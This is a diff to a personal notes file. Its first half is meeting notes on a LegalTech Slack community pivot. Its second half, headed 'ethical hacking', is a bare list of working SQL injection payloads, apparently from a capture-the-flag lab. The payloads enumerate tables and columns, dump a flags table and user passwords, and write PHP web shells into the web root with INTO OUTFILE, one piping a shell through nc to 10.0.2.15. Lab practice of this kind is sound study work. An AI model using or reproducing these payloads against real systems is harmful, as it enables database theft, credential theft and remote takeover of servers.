@@ -1,3 +1,40 @@
 #+AUTHOR: CALIN CAPITANU
 #+TITLE: Quick Notes
 
+* Hailey meeting 12/08/2020
+** What do you think Hailey can achieve, do and use the Slack channel for - how does it differ from the custom made app?
+Only through slack I think we can do at most the following:
++ Gather a medium sized community
++ Get 5-10% of that community to actively interact with eachother and be interested in our posts there
++ Organize LegalTech events
+It is mostly different in terms of control over how users interact with the platform. I think that the initial target of this is to gather a 
+community, thus for the short-term, there is nothing more that a dedicated app would offer, but needs might arise for specific implementations.
+** What do you envision your role in relation to the Hailey Slack channel to be? What do you want to do in the Slack channel?
+I would like to see myself as a moderator for the tech channel along with Leandro.
+** How does your role change in the light of the pivot?
+   It all depends on what are the next decisions, haha. If the decision is that we are building smaller tools to help the legal-tech community, then 
+   I'd guess my role would still be as a developer, which would be great. Otherwise, I think my role would be more of a Newspaper Reporter to the
+tech channel, maybe Moderator as above mentioned.
+** What are the new roles and necessities you see emerging from the pivot?
+Definetely crowd controllers and community builders. People that know how people work, if that makes sense. People that know how to 
+keep people talking and engaged in conversation. We are trying basically to become a group of influencers, which we need reputation for,
+thus people with such knowledge would be great (vloggers, bloggers).
+** What new commitments or changes to your excisiting ones are you ready to make due to the pivot?
+I would like to be involved as much as I was before, I think it is the right amount of work I can do at the moment, school starts in 2 weeks, or one 
+which is scary, but I might be able to do more at times, possible less at other times (exams of course). But around 8 to 10 hours a week is usually something
+I can do for 
+* ethical hacking
+** databases
+%' UNION (SELECT 1,table_name,3,4  FROM information_schema.tables ) UNION SELECT 1,2,3,4 FROM users WHERE 1 LIKE '%
+** columns
+%' UNION (SELECT 1,column_name,3,4  FROM information_schema.columns WHERE TABLE_NAME = 'users') UNION SELECT 1,2,3,4 FROM users WHERE 1 LIKE '%
+** flag
+%' UNION (SELECT 1,flag,3,4  FROM flags) UNION SELECT 1,2,3,4 FROM users WHERE 1 LIKE '%
+** passwords
+%' UNION (SELECT usID, usPseudo, usPasse , usAvecPhoto  FROM users) UNION SELECT 1,2,3,4 FROM users WHERE 1 LIKE '%
+
+
+
+%' union select 1, '<?php system($_GET["cmd"]); ?>',2,3 into outfile '/var/www/html/php/cmd.php' #
+
+%' union select 1, '<?php system('/bin/sh | nc 10.0.2.15 5566'); ?>',2,3 into outfile '/var/www/html/php/cmd1.php' #
